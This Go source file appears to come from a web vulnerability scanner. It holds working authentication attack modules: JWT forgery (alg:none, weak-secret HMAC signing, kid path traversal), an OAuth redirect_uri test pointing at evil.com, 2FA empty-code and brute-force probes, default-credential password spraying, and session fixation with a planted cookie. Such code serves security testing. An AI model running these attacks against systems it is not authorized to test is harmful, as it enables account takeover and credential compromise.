package scanner

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
)

// --- JWT Attack Suite ---

func scanJWT(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	// Find JWT tokens in responses
	for _, page := range crawl.Pages {
		wg.Add(1)
		go func(p crawler.Page) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			resp := http.Get(p.URL)
			if resp.Err != nil {
				return
			}
			// Check headers and body for JWTs
			tokens := extractJWTs(resp.Body + resp.Headers.Get("Authorization") + resp.Headers.Get("Set-Cookie"))
			for _, token := range tokens {
				results := attackJWT(http, p.URL, token)
				mu.Lock()
				findings = append(findings, results...)
				mu.Unlock()
			}
		}(page)
	}
	wg.Wait()
	return findings
}

func extractJWTs(text string) []string {
	var tokens []string
	parts := strings.Fields(text)
	for _, p := range parts {
		p = strings.Trim(p, `"';,`)
		if isJWT(p) {
			tokens = append(tokens, p)
		}
	}
	return tokens
}

func isJWT(s string) bool {
	parts := strings.Split(s, ".")
	if len(parts) != 3 {
		return false
	}
	_, err := base64.RawURLEncoding.DecodeString(parts[0])
	return err == nil && len(parts[0]) > 10
}

func attackJWT(httpClient *engine.HTTPClient, targetURL, token string) []Finding {
	var findings []Finding
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil
	}

	headerBytes, _ := base64.RawURLEncoding.DecodeString(parts[0])
	payloadBytes, _ := base64.RawURLEncoding.DecodeString(parts[1])

	// 1. alg:none attack
	var header map[string]interface{}
	json.Unmarshal(headerBytes, &header)
	header["alg"] = "none"
	newHeader, _ := json.Marshal(header)
	forgedNone := base64.RawURLEncoding.EncodeToString(newHeader) + "." + parts[1] + "."

	resp := httpClient.Get(targetURL + "?token=" + forgedNone)
	if resp.Err == nil && resp.StatusCode == 200 && !strings.Contains(strings.ToLower(resp.Body), "invalid") {
		findings = append(findings, Finding{
			Type: "JWT Algorithm None Bypass", Severity: "critical",
			URL: targetURL, Payload: "alg:none",
			Detail:   "Server accepts JWT with alg=none (no signature verification)",
			Template: "apex-jwt-none",
		})
	}

	// 2. HS256/RS256 confusion (sign with public key as HMAC secret)
	header["alg"] = "HS256"
	newHeader, _ = json.Marshal(header)
	h := base64.RawURLEncoding.EncodeToString(newHeader)
	// Try common weak secrets
	for _, secret := range []string{"secret", "password", "key", "123456", ""} {
		mac := hmac.New(sha256.New, []byte(secret))
		mac.Write([]byte(h + "." + parts[1]))
		sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
		forged := h + "." + parts[1] + "." + sig

		resp := httpClient.Get(targetURL + "?token=" + forged)
		if resp.Err == nil && resp.StatusCode == 200 && !strings.Contains(strings.ToLower(resp.Body), "invalid") {
			findings = append(findings, Finding{
				Type: "JWT Weak Secret", Severity: "critical",
				URL: targetURL, Payload: fmt.Sprintf("secret='%s'", secret),
				Detail:   fmt.Sprintf("JWT signed with weak secret '%s' accepted", secret),
				Template: "apex-jwt-weak-secret",
			})
			break
		}
	}

	// 3. kid injection
	header["kid"] = "../../dev/null"
	header["alg"] = "HS256"
	newHeader, _ = json.Marshal(header)
	h = base64.RawURLEncoding.EncodeToString(newHeader)
	mac := hmac.New(sha256.New, []byte(""))
	mac.Write([]byte(h + "." + parts[1]))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	forgedKid := h + "." + parts[1] + "." + sig

	resp = httpClient.Get(targetURL + "?token=" + forgedKid)
	if resp.Err == nil && resp.StatusCode == 200 && !strings.Contains(strings.ToLower(resp.Body), "invalid") {
		findings = append(findings, Finding{
			Type: "JWT KID Path Traversal", Severity: "critical",
			URL: targetURL, Payload: "kid=../../dev/null",
			Detail:   "JWT with kid pointing to /dev/null accepted (empty key signing)",
			Template: "apex-jwt-kid",
		})
	}

	// 4. Payload manipulation (change role/admin)
	var payload map[string]interface{}
	json.Unmarshal(payloadBytes, &payload)
	if _, ok := payload["role"]; ok {
		payload["role"] = "admin"
	}
	if _, ok := payload["admin"]; ok {
		payload["admin"] = true
	}
	payload["is_admin"] = true
	_ = payload // Would need to re-sign, but test if server doesn't verify sig

	return findings
}

// --- OAuth Scanner ---

func scanOAuth(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result) []Finding {
	var findings []Finding

	oauthPaths := []string{"/oauth/authorize", "/oauth/callback", "/auth/callback",
		"/login/oauth", "/api/oauth", "/.well-known/openid-configuration"}

	for _, target := range crawl.Pages[:min(20, len(crawl.Pages))] {
		baseURL := strings.Split(target.URL, "/")[0] + "//" + strings.Split(target.URL, "/")[2]

		for _, path := range oauthPaths {
			url := baseURL + path

			// Test open redirect in redirect_uri
			testURL := url + "?redirect_uri=https://evil.com&response_type=code&client_id=test"
			resp := http.Get(testURL)
			if resp.Err == nil && resp.StatusCode >= 300 && resp.StatusCode < 400 {
				loc := resp.Headers.Get("Location")
				if strings.Contains(loc, "evil.com") {
					findings = append(findings, Finding{
						Type: "OAuth Open Redirect — Token Theft", Severity: "critical",
						URL: testURL, Detail: "redirect_uri accepts arbitrary domain. OAuth token theft possible.",
						Template: "apex-oauth-redirect",
					})
				}
			}

			// Test state parameter missing
			testURL = url + "?redirect_uri=" + baseURL + "/callback&response_type=code&client_id=test"
			resp = http.Get(testURL)
			if resp.Err == nil && resp.StatusCode == 200 && !strings.Contains(resp.Body, "state") {
				findings = append(findings, Finding{
					Type: "OAuth Missing State Parameter — CSRF", Severity: "medium",
					URL: testURL, Detail: "OAuth flow doesn't require state parameter. CSRF on login possible.",
					Template: "apex-oauth-csrf",
				})
			}
		}
	}
	return findings
}

// --- 2FA Bypass ---

func scan2FABypass(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result) []Finding {
	var findings []Finding

	twoFAPaths := []string{"/verify", "/2fa", "/mfa", "/otp", "/verify-otp",
		"/api/verify", "/auth/2fa", "/account/verify"}

	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		baseURL := strings.Split(page.URL, "/")[0] + "//" + strings.Split(page.URL, "/")[2]

		for _, path := range twoFAPaths {
			url := baseURL + path

			// Test response manipulation (change status in response)
			resp := http.Post(url, "application/json", `{"code":"000000"}`)
			if resp.Err != nil {
				continue
			}

			// Test with empty code
			resp2 := http.Post(url, "application/json", `{"code":""}`)
			if resp2.Err == nil && resp2.StatusCode == 200 && resp.StatusCode != 200 {
				findings = append(findings, Finding{
					Type: "2FA Bypass — Empty Code Accepted", Severity: "critical",
					URL: url, Detail: "Empty OTP code returns 200. 2FA can be bypassed.",
					Template: "apex-2fa-bypass",
				})
			}

			// Test brute force (no rate limit)
			codes := []string{"000000", "000001", "000002", "000003", "000004", "000005"}
			blocked := false
			for _, code := range codes {
				r := http.Post(url, "application/json", fmt.Sprintf(`{"code":"%s"}`, code))
				if r.Err == nil && r.StatusCode == 429 {
					blocked = true
					break
				}
			}
			if !blocked && resp.StatusCode != 404 {
				findings = append(findings, Finding{
					Type: "2FA No Rate Limit — Brute Force Possible", Severity: "high",
					URL: url, Detail: "No rate limiting on OTP verification. 6-digit code brutable in <1000 requests.",
					Template: "apex-2fa-no-ratelimit",
				})
			}
		}
	}
	return findings
}

// --- Password Spray ---

func scanPasswordSpray(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result) []Finding {
	var findings []Finding

	loginPaths := []string{"/login", "/api/login", "/auth/login", "/api/auth/signin",
		"/api/v1/login", "/admin/login", "/wp-login.php"}

	commonCreds := []struct{ user, pass string }{
		{"admin", "admin"}, {"admin", "password"}, {"admin", "123456"},
		{"test", "test"}, {"root", "root"}, {"admin", "admin123"},
		{"user", "user"}, {"demo", "demo"}, {"guest", "guest"},
	}

	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		baseURL := strings.Split(page.URL, "/")[0] + "//" + strings.Split(page.URL, "/")[2]

		for _, path := range loginPaths {
			url := baseURL + path
			// Check if login endpoint exists
			resp := http.Get(url)
			if resp.Err != nil || resp.StatusCode == 404 {
				continue
			}

			for _, cred := range commonCreds {
				body := fmt.Sprintf(`{"username":"%s","password":"%s"}`, cred.user, cred.pass)
				r := http.Post(url, "application/json", body)
				if r.Err != nil {
					continue
				}
				// Detect successful login
				if r.StatusCode == 200 && (strings.Contains(r.Body, "token") ||
					strings.Contains(r.Body, "session") ||
					strings.Contains(r.Body, "success") ||
					r.Headers.Get("Set-Cookie") != "") {
					findings = append(findings, Finding{
						Type: "Default Credentials — Login Success", Severity: "critical",
						URL: url, Payload: fmt.Sprintf("%s:%s", cred.user, cred.pass),
						Detail:   fmt.Sprintf("Login with %s:%s succeeded", cred.user, cred.pass),
						Template: "apex-default-creds",
					})
					break
				}
			}
		}
	}
	return findings
}

// --- Session Fixation ---

func scanSessionFixation(cfg *engine.Config, httpClient *engine.HTTPClient, crawl *crawler.Result) []Finding {
	var findings []Finding

	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		items := []engine.RequestItem{{
			URL:     page.URL,
			Method:  "GET",
			Headers: map[string]string{"Cookie": "session=attacker_fixed_session_123"},
		}}
		for resp := range httpClient.BatchRequest(items, 1) {
			if resp.Err != nil {
				continue
			}
			setCookie := resp.Headers.Get("Set-Cookie")
			if resp.StatusCode == 200 && setCookie == "" {
				findings = append(findings, Finding{
					Type: "Session Fixation", Severity: "medium",
					URL: page.URL, Detail: "Server accepts arbitrary session ID without regeneration",
					Template: "apex-session-fixation",
				})
			}
		}
	}
	return findings
}

// Placeholder to avoid import cycle — actual timing helper
func sleepMs(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}
